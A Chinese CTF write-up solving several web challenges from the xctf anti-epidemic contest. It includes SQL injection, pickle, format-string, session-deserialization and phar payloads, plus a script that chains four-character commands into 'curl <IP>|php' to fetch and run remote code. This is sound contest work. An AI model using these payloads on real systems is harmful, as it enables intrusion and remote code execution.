date: 2020-03-10
categories:
- 比赛
tags:
- wp
- ctf
title: xctf高校抗疫
---
# 高校战疫

打完这次比赛,我再次认清了自己是个卑微的递茶小弟...

## web



###  **easy_trick_gzmtu**

```
2020\\%27 200
2020%27 500
2020\%27 500
```

可能作为格式化字符串或者过滤`\` ?,继续测试

```
http://121.37.181.246:6333/?time=2020' or 1%23  =>500
http://121.37.181.246:6333/?time=2020or'%23 =>无结果,说明不是过滤or
http://121.37.181.246:6333/?time=2020'%23or=>没有500,说明or不在黑名单中 

```

```
/?time=2020%27%20||1=1%20--+    返回正确结果
/?time=2020%27%20or1=1%20--+   and   &&都页面报错
/?time=-1%27%20||1=0%20--+   页面的hello world消失，应该存在布尔盲注
```

```
?time=0'||\i\f(\s\l\e\e\p(2),1,1)%23
成功执行,说明是过滤\
```

```python
import requests,re
sql="union select 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata"
#sql="union select 1,GROUP_CONCAT(id,',',username,',',passwd,',',url,','),3 FROM admin"
#admin,content
#admin
#id,username,passwd,url
#0,admin,20200202goodluck,/eGlhb2xldW5n,
tmp=""
for i in sql:
    if i.isalpha():
        tmp+="\\"+i
        #print("\\"+i,end="")
    else:
        tmp+=i
        #print(i,end="")

tmp="http://121.37.181.246:6333/?time=0'+{}%23".format(tmp)
res=requests.get(tmp)
result=re.search(r'<div class="text-c ">(.*)</div>',res.text)
print(result.group(1))
```


拿到后台地址和管理员账号


```
http://121.37.181.246:6333/eGlhb2xldW5n
admin,20200202goodluck
```

```
http://121.37.181.246:6333/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php
http://121.37.181.246:6333/eGlhb2xldW5n/check.php
http://121.37.181.246:6333/eGlhb2xldW5n/index.php

```


php版本5.5.9,%00截断

check.php中可以读取文件但是需要本地访问

```
Host: 127.0.0.1
X-Forwarded-For: 127.0.0.1
Client-Ip: 127.0.0.1
Referer: http://127.0.0.1/eGlhb2xldW5n/check.php
```

```
没有用
eGlhb2xldW5nLnBocA==:xiaoleung.php
eGlhb2xldW5n:xiaoleung
注释里给的:eGlhb2xldW5nLnBocA==.php
可能是突破的关键,但是里面啥都没有
对eGlhb2xldW5nLnBocA==.php进行参数爆破,也没结果

```



存在http请求走私

```
GET /eGlhb2xldW5n/check.php?url=fuck&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1
Host: 121.37.181.246:6333
X-Forwarded-For: 127.0.0.1
Client-Ip: 127.0.0.1
Cookie: PHPSESSID=9gkhjmmmp6ctmnn2578n3hcth1

GET /eGlhb2xldW5n/check.php?url=fuck&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1
Host: localhost
X-Forwarded-For: 127.0.0.1
Client-Ip: 127.0.0.1
Cookie: PHPSESSID=9gkhjmmmp6ctmnn2578n3hcth1


```

最后学长跟我说这里本地访问的意思是url中的ip地址要为127.0.0.1........无语



GET /eGlhb2xldW5n/check.php?url=file://localhost/var/www/html/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1

```php
<?php

class trick{
	public $gf;
	public function content_to_file($content){	
		$passwd = $_GET['pass'];
		if(preg_match('/^[a-z]+\.passwd$/m',$passwd)) 
	{ 

		if(strpos($passwd,"20200202")){
			echo file_get_contents("/".$content);

		}

		 } 
		}
	public function aiisc_to_chr($number){
		if(strlen($number)>2){
		$str = "";
		 $number = str_split($number,2);
		 foreach ($number as $num ) {
		 	$str = $str .chr($num);
		 }
		 return strtolower($str);
		}
		return chr($number);
	}
	public function calc(){
		$gf=$this->gf;
		if(!preg_match('/[a-zA-z0-9]|\&|\^|#|\$|%/', $gf)){
		  	eval('$content='.$gf.';');
		  	$content =  $this->aiisc_to_chr($content); 
		  	return $content;
		}
	}
	public function __destruct(){
        $this->content_to_file($this->calc());
        
    }
	
}
unserialize((base64_decode($_GET['code'])));

?>
```
我们要逻辑运算符非来绕过`preg_match('/[a-zA-z0-9]|\&|\^|#|\$|%/', $gf)`


```http
GET /eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php?pass=aaa.passwd%0a20200202&code=Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czoxMToifiLIz8jJycrIziIiO30%3DD HTTP/1.1
```

### webtmp

```python
import base64
import io
import sys
import pickle

from flask import Flask, Response, render_template, request
import secret


app = Flask(__name__)


class Animal:
    def __init__(self, name, category):
        self.name = name
        self.category = category

    def __repr__(self):
        return f'Animal(name={self.name!r}, category={self.category!r})'

    def __eq__(self, other):
        return type(other) is Animal and self.name == other.name and self.category == other.category


class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == '__main__':
            return getattr(sys.modules['__main__'], name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))


def restricted_loads(s):
    return RestrictedUnpickler(io.BytesIO(s)).load()


def read(filename, encoding='utf-8'):
    with open(filename, 'r', encoding=encoding) as fin:
        return fin.read()


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.args.get('source'):
        return Response(read(__file__), mimetype='text/plain')

    if request.method == 'POST':
        try:
            pickle_data = request.form.get('data')
            if b'R' in base64.b64decode(pickle_data):
                return 'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'
            else:
                result = restricted_loads(base64.b64decode(pickle_data))
                if type(result) is not Animal:
                    return 'Are you sure that is an animal???'
            correct = (result == Animal(secret.name, secret.category))
            return render_template('unpickle_result.html', result=result, pickle_data=pickle_data, giveflag=correct)
        except Exception as e:
            print(repr(e))
            return "Something wrong"

    sample_obj = Animal('一给我哩giaogiao', 'Giao')
    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()
    return render_template('unpickle_page.html', sample_obj=sample_obj, pickle_data=pickle_data)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

我们可以控制反序列化的内容

但是反序列化还有限制:

```python
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == '__main__':
            return getattr(sys.modules['__main__'], name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))


def restricted_loads(s):
    return RestrictedUnpickler(io.BytesIO(s)).load()
```

只能再`__main__`中寻找属性,这样我们也就无法直接读取secret里的内容了

关键:

`return render_template('unpickle_result.html', result=result, pickle_data=pickle_data, giveflag=correct)`

不知道是`correct!=False`给flag还是`correct==True`给flag

决定correct的是:` correct = (result == Animal(secret.name, secret.category))`

会调用`Animal的__eq__`我们可以令`__eq__`等于其他的函数来绕过,但是没有找到合适的两个参数的函数

后来发现`Animal(secret.name, secret.category)`是在反序列化之后执行的,如果我们可以修改secret,那么我们就可以控制结果

payload:

```python
import pickle
import base64
p=b'''c__main__
secret
(S'name'
S'test'
S'category'
S'test'
db'''+pickle.loads(Animal("test","test"))
print(base64.b64encode(p))
```

` flag{409ed945-5b77-4ec3-97e1-b395778842ba} `



### fmkq


begin 那里搞个 %s% 就行了。

8080 出东西了

```
Welcome to our FMKQ api, you could use the help information below
To read file:
    /read/file=example&vipcode=example
    if you are not vip,let vipcode=0,and you can only read /tmp/{file}
Other functions only for the vip!!!
```
```
http://121.37.179.47:1101/?begin=%s%&head=\&url=http://127.0.0.1:8080/read/file=/tmp/flag%26vipcode=1
```

flag在 /未知目录/flag。至少能扫目录，或者直接 getshell

![image7052](https://i.loli.net/2020/03/08/qlPynLj3IOkZu9A.png)


在fuzz过程中有一下报错
```
Absolute URI not allowed if server is not a proxy.
Malformed Request-Line: bad protocol
Malformed Request-URI
```
去网上查了下可能是cherrypy

当输入{file}时,其对应的输出为:error,说明可能有ssti或者格式化字符串漏洞

利用格式化字符串读取vipcode,从而任意文件读取

```
{file.__class__.__init__.__globals__}
['lib', 'media', 'opt', 'var', 'usr', 'mnt', 'bin', 'root', 'home', 'tmp', 'boot', 'sys', 'run', 'sbin', 'srv', 'lib64', 'etc', 'dev', 'proc', 'app', '.dockerenv', 'fl4g_1s_h3re_u_wi11_rua']

{'truevipcode': '3Ad8fya45bYeUOFDkJuXpjV1tGHLxzonrCWlER2mPKS9i67w'}
'__file__': '/app/base/readfile.py'


```


```
/?head=\&url=http://127.0.0.1:8080/read/file=/etc/passwd%26vipcode=3Ad8fya45bYeUOFDkJuXpjV1tGHLxzonrCWlER2mPKS9i67w&begin=%s%
```

vip.py

```python

import random
import string


vipcode = ''


class vip:
    def __init__(self):
        global vipcode
        if vipcode == '':
            vipcode = ''.join(random.sample(string.ascii_letters+string.digits, 48))
            self.truevipcode = vipcode
        else:
            self.truevipcode = vipcode

    def GetCode(self):
        return self.truevipcode
```


readfile.py

```python
from .vip import vip
import re
import os


class File:
    def __init__(self,file):
        self.file = file

    def __str__(self):
        return self.file

    def GetName(self):
        return self.file


class readfile():

    def __str__(self):
        filename = self.GetFileName()
        if '..' in filename or 'proc' in filename:
            return "quanbumuda"
        else:
            try:
                file = open("/tmp/" + filename, 'r')
                content = file.read()
                file.close()
                return content
            except:
                return "error"

    def __init__(self, data):
        if re.match(r'file=.*?&vipcode=.*?',data) != None:
            data = data.split('&')
            data = {
                data[0].split('=')[0]: data[0].split('=')[1],
                data[1].split('=')[0]: data[1].split('=')[1]
            }
            if 'file' in data.keys():
                self.file = File(data['file'])

            if 'vipcode' in data.keys():
                self.vipcode = data['vipcode']
            self.vip = vip()


    def test(self):
        if 'file' not in dir(self) or 'vipcode' not in dir(self) or 'vip' not in dir(self):
            return False
        else:
            return True

    def isvip(self):
        if self.vipcode == self.vip.GetCode():
            return True
        else:
            return False

    def GetFileName(self):
        return self.file.GetName()


current_folder_file = []


class vipreadfile():
    def __init__(self,readfile):
        self.filename = readfile.GetFileName()
        self.path = os.path.dirname(os.path.abspath(self.filename))
        self.file = File(os.path.basename(os.path.abspath(self.filename)))
        global current_folder_file
        try:
            current_folder_file = os.listdir(self.path)
        except:
            current_folder_file = current_folder_file

    def __str__(self):
        if 'fl4g' in self.path:
            return 'nonono,this folder is a secret!!!'
        else:
            output = '''Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n'''
            filepath = (self.path + '/{vipfile}').format(vipfile=self.file)
            output += filepath
            output += '\r\n\r\nThe content is:\r\n'
            try:
                f = open(filepath,'r')
                content = f.read()
                f.close()
            except:
                content = 'can\'t read'
            output += content
            output += '\r\n\r\nOther files under the same folder:\r\n'
            output += ' '.join(current_folder_file)
            return output
```

app.py
```python
import web
from urllib.parse import unquote
from base.readfile import *

urls = (
    '/', 'help',
    '/read/(.*)','read'
)
web.config.debug = False

class help:
    def GET(self):
        help_information = '''
        Welcome to our FMKQ api, you could use the help information below
        To read file:
            /read/file=example&vipcode=example
            if you are not vip,let vipcode=0,and you can only read /tmp/{file}
        Other functions only for the vip!!!
        '''
        return help_information


class read:
    def GET(self,text):
        file2read = readfile(text)
        if file2read.test() == False:
            return "error"
        else:
            if file2read.isvip() == False:
                return ("The content of "+ file2read.GetFileName() +" is {file}").format(file=file2read)
            else:
                vipfile2read = vipreadfile(file2read)
                return (str(vipfile2read))






if __name__ == "__main__":
    app = web.application(urls, globals())
    app.run()
```

fl4g被过滤了,所以无法直接读flag

刚开始是想用fd/cwd来读取的,后来fuzz几下服务就炸掉了,所以我们换了个思路

通过拼接来绕过

```
f{vipfile.__class__.__mro__[1].__new__.__doc__[39]}4g_1s_h3re_u_wi11_rua/flag

```

flag{qoSF2nKvwoGRI7aJ}


### hackme

session引擎设置错误导致的反序列化

`profile.php`处的`ini_set('session.serialize_handler', 'php');`

其他地方基本都是`ini_set('session.serialize_handler','php_serialize');`



我们利用sign参数来写入恶意session

浏览代码发现,这里是我们的目的

```php
<?php
require_once('./init.php');
error_reporting(0);
if (check_session($_SESSION)) {
    #变成管理员吧，奥利给
} else {
    die('只有管理员才能看到我哟');
}

function check_session($session)
{
    foreach ($session as $keys => $values) {
        foreach ($values as $key => $value) {
            if ($key === 'admin' && $value === 1) {
                return true;
            }
        }
    }
    return false;
}
```

我们最终要构造

```php
array(
	'xxxx':array('admin',1)
);
```

原本我们直接在`upload_sign.php`中post : `sigh[admin]=1`即可

但是`upload_sign.php`的session引擎是`ini_set('session.serialize_handler','php_serialize');`

而`core/index.php`的session引擎是:`ini_set('session.serialize_handler', 'php');`

也就是说session是无法被正确解析的

>- php:存储方式是，键名+竖线+经过serialize()函数序列处理的值
>- php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值
>

根据php和php_serialize两个反序列化引擎的不同之处,我们构造

`sign=|a%3A1%3A%7Bs%3A5%3A%22admin%22%3Bi%3A1%3B%7D`

拿到

```php
require_once('./init.php');
error_reporting(0);
if (check_session($_SESSION)) {
    #hint : core/clear.php
    $sandbox = './sandbox/' . md5("Mrk@1xI^" . $_SERVER['REMOTE_ADDR']);
    echo $sandbox;
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_POST['url'])) {
        $url = $_POST['url'];
        if (filter_var($url, FILTER_VALIDATE_URL)) {
            if (preg_match('/(data:\/\/)|(&)|(\|)|(\.\/)/i', $url)) {
                echo "you are hacker";
            } else {
                $res = parse_url($url);
                if (preg_match('/127\.0\.0\.1$/', $res['host'])) {
                    $code = file_get_contents($url);
                    if (strlen($code) <= 4) {
                        @exec($code);
                    } else {
                        echo "try again";
                    }
                }
            }
        } else {
            echo "invalid url";
        }
    } else {
        highlight_file(__FILE__);
    }
} else {
    die('只有管理员才能看到我哟');
}
```



用` compress.zlib://data:@127.0.0.1/plain;base64,xxx `来代替data协议



```python

import random,base64,requests
import time
shell_ip = '39.108.164.219'
 

 
# 将shell_IP转换成十六进制
ip = '0x' + ''.join([str(hex(int(i))[2:].zfill(2))
                     for i in shell_ip.split('.')])
 
# payload某些位置的可选字符
pos0 = 'f'
pos1 = 'k'
pos2 = 'g'  # 随意选择字符
 
payload = [
    '>dir',
    # 创建名为 dir 的文件
 
    '>%s\\>' % pos0,
    # 假设pos0选择 f , 创建名为 f> 的文件
 
    '>%st-' % pos1,
    # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，
    # 因为alphabetical序中t>s
 
    '>sl',
    # 创建名为 >sl 的文件；到此处有四个文件，
    # ls 的结果会是：dir f> kt- sl
 
    '*>v',
    # 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f> kt- sl`>v ，
    #  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f> kt- sl
    # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符
 
    '>rev',
    # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f> kt- rev sl v
 
    '*v>%s' % pos2,
    # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。
    # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk > f
 
    # 续行分割 curl 0x11223344|php 并逆序写入
    '>p',
    '>ph\\',
    '>\\|\\',
    '>%s\\' % ip[8:10],
    '>%s\\' % ip[6:8],
    '>%s\\' % ip[4:6],
    '>%s\\' % ip[2:4],
    '>%s\\' % ip[0:2],
    '>\\ \\',
    '>rl\\',
    '>cu\\',
 
    'sh ' + pos2,
    'sh ' + pos0,
]
burp0_url = "http://121.36.222.22:88/core/index.php"
burp0_cookies = {"PHPSESSID": "d0669b0c49bf308022c430b52699b257", "JSESSIONID": "E1715942F5CF2C337F1B86D0B6F324E0"}
burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Origin": "http://121.36.222.22:88", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://121.36.222.22:88/core/index.php", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
for i in payload:
    assert len(i) <= 4
    burp0_data = {"url": "compress.zlib://data:@127.0.0.1/plain;base64,"+str(base64.b64encode(bytes(i,encoding="ascii")),encoding="ascii")}
    r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    print(r.status_code,burp0_data,i)
    print(r.text)
    time.sleep(0.1)


```

`flag{B11e_oX4461_Y2h1_100_OIZW4===}`



### sqlcheckin

最简单的题目之一

payload:`'-'0`



### php-uaf

https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php
直接include就可以了,但是有时候可以,有时候不可以
![image16793](https://i.loli.net/2020/03/08/Cd7RqZwApre2Lxo.png)

flag{SObARsac1TyC0V9B}

### webct

www.zip获得源码

利用mysql load data 来 反序列化

```php

$phar = new Phar("phar.phar"); //后缀名必须为phar,phar伪协议不用phar后缀
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new Fileupload(new Listfile("/;/readflag;"));
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

```

https://github.com/Gifts/Rogue-MySql-Server

刚开始的时候本地成功打通,但是靶机那里怎么也打不通

自己弄了个7.3.15的环境后发现

![image17357](https://i.loli.net/2020/03/09/9bRVz63Ym7LDNxr.png)
option那里要数字不要字符串
MYSQLI_OPT_LOCAL_INFILE对应的数字是8